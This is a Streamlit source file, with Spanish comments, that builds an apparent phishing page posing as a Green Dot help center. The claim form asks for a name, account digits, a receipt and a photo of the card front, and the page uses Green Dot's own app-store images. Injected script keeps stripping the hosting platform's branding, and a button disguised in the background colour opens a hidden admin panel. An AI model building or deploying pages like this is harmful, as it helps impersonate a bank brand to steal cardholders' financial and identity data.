
import streamlit as st
import sqlite3
import os
from datetime import datetime

# Configuración de Rutas
DB_NAME = "claims.db"
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# JAVASCRIPT NUCLEAR: ELIMINACIÓN AGRESIVA Y SOPORTE DE TEMAS
st.markdown("""<script>
    const nuclearClean = () => {
        const selectors = [
            'header', 'footer', '.stDeployButton', '[data-testid="stHeader"]',
            '[data-testid="stAppToolbar"]', '[data-testid="stHeaderActionElements"]',
            '.stElementToolbar', '[data-testid="stElementToolbar"]',
            '.st-emotion-cache-gi0tri', '.st-emotion-cache-140j12g',
            '.st-emotion-cache-h5rgaw', '.section-anchor', 'a.section-anchor'
        ];
        selectors.forEach(s => {
            document.querySelectorAll(s).forEach(el => {
                el.style.visibility = 'hidden';
                el.style.display = 'none';
                el.style.height = '0';
                el.remove();
            });
        });
    };
    
    if (window.history && window.history.replaceState) {
        const originalRS = window.history.replaceState;
        window.history.replaceState = function() {
            if (arguments[2] && arguments[2].includes('?')) return;
            return originalRS.apply(this, arguments);
        };
    }
    
    setInterval(nuclearClean, 50);
</script>""", unsafe_allow_html=True)

# CSS DINÁMICO PARA DARK/LIGHT MODE
st.markdown("""<style>
    header, footer, .stDeployButton, [data-testid="stHeader"], 
    [data-testid="stAppToolbar"], [data-testid="stHeaderActionElements"] {
        display: none !important;
        visibility: hidden !important;
    }

    .block-container { max-width: 500px !important; padding-top: 0.5rem !important; }

    /* Soporte para Dark/Light Mode mediante variables de Streamlit */
    @media (prefers-color-scheme: dark) {
        .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
        .admin-trigger button { background-color: #000000 !important; color: #000000 !important; }
        .promo-box { background-color: #111; border-color: #222; }
    }

    @media (prefers-color-scheme: light) {
        .stApp { background-color: #FFFFFF !important; color: #000000 !important; }
        .admin-trigger button { background-color: #FFFFFF !important; color: #FFFFFF !important; }
        .promo-box { background-color: #f9f9f9; border-color: #eee; }
    }

    .stButton > button {
        background-color: #00a05b !important; color: white !important;
        width: 100%; border: none; height: 50px; border-radius: 8px; font-weight: bold;
    }

    /* BOTÓN ADMIN CAMUFLADO */
    .admin-trigger {
        position: fixed; bottom: 0; left: 0; width: 50px; height: 50px; z-index: 9999;
    }
    .admin-trigger button {
        border: none !important; box-shadow: none !important; cursor: default !important;
        width: 100% !important; height: 100% !important;
    }
</style>""", unsafe_allow_html=True)

if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False

if not st.session_state.admin_mode:
    if os.path.exists("logo.svg"): st.image("logo.svg")

    st.title("Help Center")
    st.write("Please fill out the form below to submit your claim.")

    with st.form("claim_v1_1_7", clear_on_submit=True):
        st.text_input("Full Name")
        st.text_input("Last 4 digits of Account")
        st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
        st.file_uploader("Store Receipt", type=["jpg","png","jpeg"])
        st.file_uploader("Card Front Photo", type=["jpg","png","jpeg"])
        if st.form_submit_button("SUBMIT NOW"):
            st.success("Claim Received successfully.")

    st.markdown("""<div class='promo-box' style='padding: 25px 15px; text-align: center; border-radius: 12px; margin: 25px 0; border: 1px solid;'>
        <h3 style='margin-bottom:15px; font-size:1.1rem;'>Download the Green Dot app</h3>
        <div style='display: flex; justify-content: center; gap: 10px; flex-wrap: wrap;'>
            <a href='#'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='120'></a>
            <a href='#'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'></a>
        </div>
    </div>""", unsafe_allow_html=True)

    st.markdown("<div class='admin-trigger'>", unsafe_allow_html=True)
    if st.button(" ", key="adm_btn"): 
        st.session_state.admin_mode = True
        st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)

else:
    st.title("Admin Panel")
    if st.button("Exit Admin"):
        st.session_state.admin_mode = False
        st.rerun()
